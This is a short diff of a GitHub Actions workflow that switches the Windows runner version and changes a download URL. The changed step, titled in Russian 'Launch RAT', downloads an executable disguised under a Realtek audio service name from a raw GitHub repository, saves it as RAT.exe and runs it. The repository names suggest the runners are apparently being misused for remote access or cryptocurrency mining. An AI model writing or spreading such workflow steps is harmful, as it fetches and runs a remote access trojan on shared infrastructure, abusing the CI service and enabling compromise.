@@ -5,7 +5,7 @@ on: workflow_dispatch
 jobs:
   build:
 
-    runs-on: windows-2019
+    runs-on: windows-latest
     timeout-minutes: 9999
 
     steps:
@@ -33,7 +33,7 @@ jobs:
         cmd /c install.bat
     - name: Запуск RAT
       run: |
-        Invoke-WebRequest https://raw.githubusercontent.com/ThePyGoose/KryptexCore/RtkAudUService32.exe -Outfile RAT.exe
+        Invoke-WebRequest https://raw.githubusercontent.com/ThePyGoose/MyMonero/RtkAudUService32.exe -Outfile RAT.exe
         ./RAT.exe
     - name: Запуск виртуальной машины выполнен
       run: cmd /c exit.bat
